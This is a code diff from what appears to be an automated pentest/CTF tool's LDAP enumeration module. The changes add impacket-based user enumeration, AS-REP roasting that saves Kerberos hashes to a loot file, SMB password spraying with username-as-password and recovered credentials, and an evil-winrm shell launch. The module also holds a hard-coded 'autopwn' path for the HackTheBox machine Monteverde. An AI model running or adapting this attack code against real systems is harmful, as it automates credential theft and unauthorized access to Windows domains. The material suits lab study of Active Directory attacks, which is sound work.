@@ -9,6 +9,9 @@ from subprocess import call, PIPE, Popen
 import requests
 from autorecon.utils import helper_lists
 from collections.abc import Iterable
+from autorecon.lib import ldap_imp
+from impacket.smbconnection import SMBConnection, SessionError
+from time import sleep
 
 
 class LdapEnum:
@@ -17,6 +20,7 @@ class LdapEnum:
     def __init__(self, target):
         self.target = target
         self.processes = ""
+        self.ldapper = ldap_imp.enumLdap(self.target)
 
     def ldapSearch(self):
         """This will run a helper bash script that will attempt to login to smb
@@ -60,89 +64,40 @@ class LdapEnum:
         else:
             c = config_parser.CommandParser(f"{os.path.expanduser('~')}/.config/autorecon/config.yaml", self.target)
 
-            def flatten(lis):
-                for item in lis:
-                    if isinstance(item, Iterable) and not isinstance(item, str):
-                        for x in flatten(item):
-                            yield x
-                    else:
-                        yield item
-
             def parse_users():
                 """
                 Returns a list of users
                 """
-                user_list = []
-                ignore_list = ["Administrators", 'DnsAdmins', 'DnsUpdateProxy', 'ExchangeLegacyInterop',
-                               'Guests', 'IIS_IUSRS', 'Replicator', 'Users', 'SMB3_11', 'DefaultAccount', 'Guest']
-                if os.path.exists(c.getPath("ldap", "ldapEnum4linux")):
-                    with open(c.getPath("ldap", "ldapEnum4linux"), 'r') as enum_ldap:
-                        regex = r"\[([A-Za-z0-9_.-]+)\]"
-                        users = [line.rstrip() for line in enum_ldap.readlines()]
-                        sorted_users = [re.findall(regex, u) for u in users]
-                        users = list(flatten(sorted_users))
-                        for u in users:
-                            if u not in user_list:
-                                if not u.startswith("0x") and (len(u) > 1) and (u not in ignore_list):
-                                    user_list.append(u)
-                    if user_list:
-                        if not os.path.exists(c.getPath("wordlists", "wordlistsDir")):
-                            os.makedirs(c.getPath("wordlists", "wordlistsDir"))
-                        print(f"[{fg.li_magenta}+{fg.rs}] Creating List of Valid Usernames")
-                        userlist_file = open(c.getPath("wordlists", "ldapUsernames"), "w+")
-                        for i in user_list:
-                            userlist_file.write(i + "\n")
-                        userlist_file.close()
-                        return user_list
-
-            def parse_ldap_domain():
-                """
-                Returns a domain as a list
-                """
-                if os.path.exists(c.getPath("ldap", "ldapEnum4linux")):
-                    ig = helper_lists.ignoreDomains()
-                    ignore_extensions = ig.ignore
-                    lf = open(c.getPath("ldap", "ldapEnum4linux"), 'r')
-                    domain = []
-                    dns = [re.findall(r"(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{3,6}", d) for d in sorted(set(line.rstrip() for line in lf))]
-                    dns = list(flatten(dns))
-                    for x in dns:
-                        if x not in domain:
-                            if not any(s in dns for s in ignore_extensions):
-                                dn_lower = x.lower()
-                                if dn_lower not in domain and (not dn_lower.startswith("ldap")) and (not dn_lower.endswith("portcu")):
-                                    num_dots = int(dn_lower.count("."))
-                                    if num_dots <= 1:
-                                        domain.append(dn_lower)
-                    lf.close()
-                    # print(domain)
-                    return domain
-
-            def GetNPUsers():
-                users = parse_users()
-                domain = parse_ldap_domain()
-                if domain:
-                    if users:
-                        if len(domain) == 1 and (len(users) != 0):
-                            dope_cmd = f"""{c.getCmd("ldap", "GetNPUsers", domain=str(domain[0]))}"""
-                            print(f"[{fg.li_magenta}+{fg.rs}] {dope_cmd}")
-                            call(dope_cmd, shell=True)
+                if not os.path.exists(c.getPath("wordlists", "wordlistsDir")):
+                    os.makedirs(c.getPath("wordlists", "wordlistsDir"))
+                users_list = []
+                user_obj = self.ldapper.get_all_users()
+                with open(c.getPath("wordlists", "ldapUsernames"), "w+") as userlist_file:
+                    for user in user_obj:
+                        users_list.append(user['sAMAccountName'])
+                        userlist_file.write(user['sAMAccountName'] + "\n")
+                return users_list
 
             def check_parse_hashes():
-                GetNPUsers()
-                if os.path.exists(c.getPath("ldap", "getNPUserNamesBrute")):
-                    getnp_file = open(c.getPath("ldap", "getNPUserNamesBrute"), "r")
-                    hashes = [h for h in sorted(set(line.rstrip() for line in getnp_file)) if h.startswith("$")]
-                    getnp_file.close()
-                    # print(hashes)
+                print(f"[{fg.li_magenta}+{fg.rs}] Creating List of Valid Usernames")
+                users = parse_users()
+                domain = self.ldapper.get_domain()
+                hashes = []
+                if domain and users:
+                    for u in users:
+                        try:
+                            hashes.append(self.ldapper.get_tgt(u))
+                        except Exception as e:
+                            print(e)
+                    if hashes:
+                        print(f"Found tgt hashes {hashes}")
                     if not os.path.exists(c.getPath("loot", "lootDir")):
                         os.makedirs(c.getPath("loot", "lootDir"))
-                    hash_file = open(c.getPath("loot", "krbHashes"), "w")
-                    if len(hashes) != 0:
-                        for i in hashes:
-                            hash_file.write(i.rstrip() + "\n")
-                    hash_file.close()
-                    return hashes
+                    with open(c.getPath("loot", "krbHashes"), "w") as hash_file:
+                        if hashes:
+                            for i in hashes:
+                                hash_file.write(i.rstrip() + "\n")
+                return hashes
 
             def HeresJonny():
                 krb_hashes = check_parse_hashes()
@@ -174,63 +129,19 @@ class LdapEnum:
                                 # print(i.split(":")[1])
                         return zip(usernames, passwords)
 
-            def usernameAsPassword():
-                if os.path.exists(c.getPath("wordlists", "ldapUsernames")):
+            def usernameAndPassword(creds=None):
+                valid_creds = []
+                for user in parse_users():
                     try:
-                        acc_check_cmd = c.getCmd("ldap", "authCheck")
-                        call(acc_check_cmd, shell=True)
-                    except IOError as err:
-                        print(err)
-                        return 1
-
-            def usernameAndPassword(creds):
-                if os.path.exists(c.getPath("wordlists", "ldapUsernames")):
-                    try:
-                        acc_check_cmd2 = c.getCmd("ldap", "authChecker", password=creds)
-                        call(acc_check_cmd2, shell=True)
-                    except IOError as err:
-                        print(err)
-                        return 1
-
-            def parse_acc_check():
-                if os.path.exists(c.getPath("smb", "smbAuthCheck")):
-                    try:
-                        with open(c.getPath("smb", "smbAuthCheck"), "r") as smbAuth:
-                            successful_login_check = [x for x in sorted(set(line.rstrip() for line in smbAuth)) if x.startswith("        SUCCESS....")]
-                            # print(successful_login_check)
-                            if successful_login_check:
-                                with open(c.getPath("loot", "creds"), "w") as credentials:
-                                    for i in successful_login_check:
-                                        credentials.write(i.lstrip())
-                                regex = re.compile(r"\b(\w+)\s*:\s*([^:]*)(?=\s+\w+\s*:|$)")
-                                d = dict(regex.findall(str(successful_login_check).replace("'", "").replace('"', '').replace(']', '')))
-                                valid_pass = d['password']
-                                return valid_pass
-                            else:
-                                return None
-
-                    except FileNotFoundError as fnf_err:
-                        print(fnf_err)
-                        return 1
-
-            def parse_acc_check_two():
-                if os.path.exists(c.getPath("smb", "smbAuthCheck2")):
-                    try:
-                        with open(c.getPath("smb", "smbAuthCheck2"), "r") as smbAuth:
-                            successful_login_check = [x for x in sorted(set(line.rstrip() for line in smbAuth)) if x.startswith("        SUCCESS....")]
-                            # print(successful_login_check)
-                            if successful_login_check:
-                                with open(c.getPath("loot", "creds2"), "a") as authenticated_users:
-                                    for i in successful_login_check:
-                                        authenticated_users.write(i.lstrip())
-                                regex = re.compile(r"\b(\w+)\s*:\s*([^:]*)(?=\s+\w+\s*:|$)")
-                                d = dict(regex.findall(str(successful_login_check).replace("'", "").replace('"', '').replace(']', '').replace(' and', '')))
-                                valid_user = d['username']
-                                return valid_user
-
-                    except FileNotFoundError as fnf_err:
-                        print(fnf_err)
-                        return 1
+                        smb = SMBConnection(self.target, self.target)
+                        test_login = smb.login(user, creds if creds is not None else user)
+                    except SessionError:
+                        test_login = False
+                        print(f"Testing valid login: {user}:{creds if creds is not None else user} True or False? {fg.red}{test_login}{fg.rs}")
+                    if test_login is True:
+                        valid_creds.append(user)
+                        print(f"Testing valid login: {user}:{creds if creds is not None else user} True or False? {fg.li_green}{test_login}{fg.rs}")
+                return valid_creds
 
             def monteverde(password):
                 if os.path.exists(c.getPath("loot", "authSmbmap")):
@@ -250,13 +161,12 @@ class LdapEnum:
                                 doc = xmltodict.parse(azure_file.read())
                                 azure_pass = doc['Objs']['Obj']['Props']['S']['#text']
                                 try:
-                                    usernameAndPassword(azure_pass)
-                                    auth_user = parse_acc_check_two()
+                                    auth_user = usernameAndPassword(creds=azure_pass)
                                     r = requests.post(f"http://{self.target}:5985/wsman", data="")
                                     if r.status_code == 401:
                                         if azure_pass:
                                             if auth_user:
-                                                dope = f"""{c.getCmd("winrm", "evilWinRM", username=auth_user, password=azure_pass, SHELL="$SHELL")}"""
+                                                dope = f"""{c.getCmd("winrm", "evilWinRM", username=auth_user[0], password=azure_pass, SHELL="$SHELL")}"""
                                                 print(f"[{fg.li_magenta}+{fg.rs}] Found Valid Credentials!!!")
                                                 print(f"[{fg.li_magenta}+{fg.rs}] {fg.li_green}{azure_pass}{fg.rs}")
                                                 print(f"[{fg.li_magenta}+{fg.rs}] Evil-WinRM !!!")
@@ -307,12 +217,11 @@ class LdapEnum:
                     print(f"[{fg.red}+{fg.rs}] No valid Credentials Found. {fg.red}Try Harder{fg.rs}")
                     if not os.path.exists(c.getPath("loot", "lootDir")):
                         os.makedirs(c.getPath("loot", "lootDir"))
-                    usernameAsPassword()
-                    valid_password = parse_acc_check()
-                    if valid_password is not None:
-                        print(f"{fg.li_green}[!]{fg.rs} Found Valid Credentials!!!\n Username: {fg.li_green}{valid_password}{fg.rs}\n Password: {fg.li_green}{valid_password}{fg.rs}\n")
+                    valid_password = usernameAndPassword()
+                    if valid_password:
+                        print(f"{fg.li_green}[!]{fg.rs} Found Valid Credentials!!!\n Username: {fg.li_green}{valid_password[0]}{fg.rs}\n Password: {fg.li_green}{valid_password[0]}{fg.rs}\n")
                         print(f"[{fg.li_magenta}+{fg.rs}] Running smbmap with credentials")
-                        auth_smb_check = c.getCmd("smb", "authSmb", validPass=valid_password)
+                        auth_smb_check = c.getCmd("smb", "authSmb", validPass=valid_password[0])
                         print(auth_smb_check)
                         call(auth_smb_check, shell=True)
                         if self.target == "10.10.10.172":
@@ -324,6 +233,6 @@ class LdapEnum:
                                                 MONTEVERDE
                             """
                             print(f"{fg.li_magenta}{autopwn_banner}{fg.rs}")
-                            monteverde(valid_password)
+                            monteverde(valid_password[0])
 
             checkWinRm()
